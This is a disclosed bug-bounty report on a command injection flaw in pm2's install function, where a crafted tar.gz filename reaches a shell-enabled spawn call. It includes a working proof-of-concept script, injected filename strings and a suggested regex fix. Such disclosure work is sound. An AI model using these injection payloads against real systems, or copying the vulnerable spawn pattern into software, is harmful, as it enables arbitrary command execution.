# Command Injection due to lack of sanitisation of tar.gz filename passed as an argument to pm2.install()  function

## Report Details
- **Report ID**: 630227
- **URL**: https://hackerone.com/reports/630227
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-06-26T20:19:49.389Z
- **Disclosed**: 2019-10-24T09:53:13.071Z

## Reporter
- **Username**: bl4de
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
Hi Guys,

It's been a while :)


I would like to report Command Injection in `pm2.import()` function when `tar.gz` archive is installed with a name provided as user controlled input.
Due to lack of proper validation of `tar.gz` archive filename, this vulnerability allows to inject arbitrary commands and execute them in context of `pm2`.

# Module

**module name:** pm2
**version:** 3.5.1
**npm page:** `https://www.npmjs.com/package/pm2`

## Module Description

PM2 is a production process manager for Node.js applications with a built-in load balancer. It allows you to keep applications alive forever, to reload them without downtime and to facilitate common system admin tasks.

## Module Stats

**~320.000 downloads/week**
**>1.200.000 downloads/month**

# Vulnerability

Packages can be installed using `pm2 install [PACKAGE NAME|PACKAGE URL] [options]` command, both directly from command line and from script using `pm2` API. Arbitrary commands can be injected with either first or second method.

Here's a command which executes `echo 'HERE'` in Bash:

```
bl4de:~/playground/Node $ ./pm2 install "foo.tar.gz;echo 'HERE'"
[PM2][Module] Installing TAR module
[PM2][Module] Installing package foo.tar.gz;echo 'HERE'
tar: Error opening archive: Failed to open 'foo.tar.gz'
HERE -C /var/folders/c8/18ksckq53x3g_086ss5r_x740000gn/T module/package.json
[PM2][ERROR] ENOENT: no such file or directory, open '/var/folders/c8/18ksckq53x3g_086ss5r_x740000gn/T/module/package.json'
┌──────────┬────┬─────────┬──────┬─────┬────────┬─────────┬────────┬─────┬─────┬──────┬──────────┐
│ App name │ id │ version │ mode │ pid │ status │ restart │ uptime │ cpu │ mem │ user │ watching │
└──────────┴────┴─────────┴──────┴─────┴────────┴─────────┴────────┴─────┴─────┴──────┴──────────┘
 Use `pm2 show <id|name>` to get more details about an app
bl4de:~/playground/Node $

```

Also, `pm2` exposes API which can be used from external scripts and this is IMHO much more dangerous attack vector than directly from command line (but still can be exploited via Bash scripts run eg. by `cron` or any other automated fashion).

Here's a simple JS exploit script (based on example provided on `https://pm2.io/doc/en/runtime/reference/pm2-programmatic/` page), which executes malicious commands defined as `payload` (this represents user provided input):


```javascript
// pm2_exploit.js

'use strict'
const pm2 = require('pm2')

// payload - user controllable input
const payload = "foo.tar.gz;touch here;echo whoami>here;chmod +x here;./here>whoamreallyare"

pm2.connect(function(err) {
    if (err) {
        console.error(err)
        process.exit(2)
    }

    pm2.start({

    }, (err, apps) => {
        pm2.install(payload, {}) // injection
        pm2.disconnect()
        if (err) {
            throw err
        }
    })
})
```

And here's the result of its execution - the file `whoamreallyare` is created and result of `whoami` command execution is put into:

```
bl4de:~/playground/Node $ ll
total 224
drwxr-xr-x  237 bl4de  staff    7584 Jun 26 19:52 node_modules
-rw-r--r--    1 bl4de  staff  106709 Jun 26 19:52 package-lock.json
lrwxr-xr-x    1 bl4de  staff      26 Jun 26 20:18 pm2 -> ./node_modules/pm2/bin/pm2
-rw-r--r--@   1 bl4de  staff     447 Jun 26 20:23 pm2_exploit.js
bl4de:~/playground/Node $ node pm2_exploit.js

/Users/bl4de/playground/Node/pm2_exploit.js:20
            throw err
            ^
Error: No script path - aborting
tar: Error opening archive: Failed to open 'foo.tar.gz'
bl4de:~/playground/Node $ ll
total 240
-rwxr-xr-x    1 bl4de  staff       7 Jun 26 20:23 here
drwxr-xr-x  237 bl4de  staff    7584 Jun 26 19:52 node_modules
-rw-r--r--    1 bl4de  staff  106709 Jun 26 19:52 package-lock.json
lrwxr-xr-x    1 bl4de  staff      26 Jun 26 20:18 pm2 -> ./node_modules/pm2/bin/pm2
-rw-r--r--@   1 bl4de  staff     447 Jun 26 20:23 pm2_exploit.js
-rw-r--r--    1 bl4de  staff       6 Jun 26 20:23 whoamreallyare
bl4de:~/playground/Node $ cat whoamreallyare
bl4de
bl4de:~/playground/Node $

```

## Vulnerability Description

The execution chain starts in `lib/API/Modules/Modularizer.js` file, in line 22, which is responsible for execution of `pm2 install` command (I've marked my comments with `////` at the beginning):

```javascript
/**
 * PM2 Module System.
 */
Modularizer.install = function (CLI, module_name, opts, cb) {
  if (typeof(opts) == 'function') {
    cb = opts;
    opts = {};
  }

  if (LOCAL.INTERNAL_MODULES.hasOwnProperty(module_name)) {
    Common.logMod(`Adding dependency ${module_name} to PM2 Runtime`);
    var currentModule = LOCAL.INTERNAL_MODULES[module_name];
    if (currentModule && currentModule.hasOwnProperty('dependencies')) {
      LOCAL.installMultipleModules(currentModule.dependencies, cb);
    } else {
      LOCAL.install(currentModule, cb);
    }
  }
  else if (module_name == '.') {
    Common.logMod(`Installing local NPM module`);
    return NPM.localStart(CLI, opts, cb)
  }
  else if (opts.tarball || module_name.indexOf('.tar.gz') > -1) {   //// vulnerable code
    Common.logMod(`Installing TAR module`);
    TAR.install(CLI, module_name, opts, cb)  //// not sanitized module_name is used as an argument here 
  }
  else {
    Common.logMod(`Installing NPM ${module_name} module`);
    NPM.install(CLI, module_name, opts, cb)
  }
};
```


Here's `TAR.install()` source code (`lib/API/Modules/TAR.js`, line 21). `module_name` variable from previous call is read as `module_filepath` argument:

```javascript
/**
 * Module management to manage tarball packages
 *
 * pm2 install http.tar.gz
 * pm2 uninstall http
 *
 * - the first and only folder in the tarball must be called module (tar zcvf http module/)
 * - a package.json must be present with attribute "name", "version" and "pm2" to declare apps to run
 */

function install(PM2, module_filepath, opts, cb) {
  // Remote file retrieval
  if (module_filepath.includes('http') === true) {
    var target_file = module_filepath.split('/').pop()
    var target_filepath = path.join(os.tmpdir(), target_file)

    opts.install_url = module_filepath

    return retrieveRemote(module_filepath, target_filepath, (err) => {
      if (err) {
        Common.errMod(err)
        process.exit(1)
      }
      installLocal(PM2, target_filepath, opts, cb)
    })
  }

  // Local install
  installLocal(PM2, module_filepath, opts, cb)   //// call to vulnerable function with unsanitized module_filepath
}
```


Last step in execution chain is `installLocal()` function call in the same `TAR.js` file (`lib/API/Modules/TAR.js`, line 71):



```javascript
function installLocal(PM2, module_filepath, opts, cb) {
  Common.logMod(`Installing package ${module_filepath}`)

  // Get module name by unpacking the module/package.json only and read the name attribute
  getModuleName(module_filepath, function(err, module_name) {
    if (err) return cb(err)

    Common.logMod(`Module name is ${module_name}`)

    Common.logMod(`Depackaging module...`)

    var install_path = path.join(cst.DEFAULT_MODULE_PATH, module_name);

    if (fs.existsSync(install_path)) {
      deleteModulePath(module_name)
    }

    require('mkdirp').sync(install_path)

    //// here unsanitized module_filepath reaches execution sink:
    var install_instance = spawn('tar', ['zxf', module_filepath, '-C', install_path, '--strip-components 1'], {
      stdio : 'inherit',
      env: process.env,
		  shell : true
    })

    install_instance.on('close', function(code) {
      Common.logMod(`Module depackaged in ${install_path}`)
      if (code == 0)
        return runInstall(PM2, install_path, module_name, opts, cb)
      return PM2.exitCli(1)
    });

    install_instance.on('error', function (err) {
      console.error(err.stack || err);
    });
  })
}

```

In the line marked with my comment `module_filepath` finally reaches `tar` OS command call, which executes payload injected as a part of `tar` archive filename.


## Steps To Reproduce:

- install pm2 (`npm i pm2`) - I've installed it locally and made symlink to executable `./node_modules/pm2/bin/pm2` in the same folder with `ln -s ./node_modules/pm2/bin/pm2 pm2` command
- run `pm2 start` to run and verify if `pm2` is installed correctly. You should see output similar to following:

```
bl4de:~/playground/Node $ ./pm2 start
[PM2][ERROR] File ecosystem.config.js not found
┌──────────┬────┬─────────┬──────┬─────┬────────┬─────────┬────────┬─────┬─────┬──────┬──────────┐
│ App name │ id │ version │ mode │ pid │ status │ restart │ uptime │ cpu │ mem │ user │ watching │
└──────────┴────┴─────────┴──────┴─────┴────────┴─────────┴────────┴─────┴─────┴──────┴──────────┘
 Use `pm2 show <id|name>` to get more details about an app
bl4de:~/playground/Node $
```

- save `pm2_exploit.js` provided in section above in the same folder and run it with `node pm2_exploit.js` command
- verify that file `whoamreallyare` was created and your username is saved there


{F517386}



## Patch

The vulnerability exists, because `tar` archive filename provided as an argument of `pm2 install` command is not validated in the correct way (here's part of `lib/API/Modules/Modularizer.js` file, `Modularizer.install` function source code):

```
else if (opts.tarball || module_name.indexOf('.tar.gz') > -1) {
    Common.logMod(`Installing TAR module`);
    TAR.install(CLI, module_name, opts, cb)
  }
```

`module_name.indexOf('.tar.gz') > -1` will return `true` always, even if it's not present at the end of the filename. Also, there is no sanitization against Bash special characters like `;` or `|` which allows to inject arbitrary commands after `tar.gz` file extension.

My suggestion is to use validation similar to following (RegExp checks if filename contains only allowed characters and ends with `tar.gz`):

```javascript
else if (opts.tarball || /^[a-z_\.-]+tar\.gz$/ig.test(module_name)) {
    Common.logMod(`Installing TAR module`);
    TAR.install(CLI, module_name, opts, cb)
  }

```

After this change, injection is no longer possible:

```javascript
'use strict';

const module_names = [
    'foo.tar.gz',
    'some-module_name.with_special_characters_but_still-valid.tar.gz',
    'foo.tar.gz;echo "HERE"',    // sample injection at the end of the filename, after ;
    'tar.gz;whoami|ls;foo.tar.gz'   // sample injection in the middle of filename
    ];


module_names.forEach( module_name => console.log(/^[a-z_\.-]+tar\.gz$/ig.test(module_name) === true ))

/*
true
true
false
false
*/
```


## Supporting Material/References:

Vulnerability was tested with following configuration:

- macOS 10.14.5
- Node 10.13.0
- npm 6.9.0

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 


Cheers,

bl4de

## Impact

An attacker is able to execute arbitrary commands if the name of `tar` archive comes as user provided input (eg. from external script using `pm2` API) and is used 'as-is' in `pm2.install()` call

## Attachments
- pm2_exploit.png
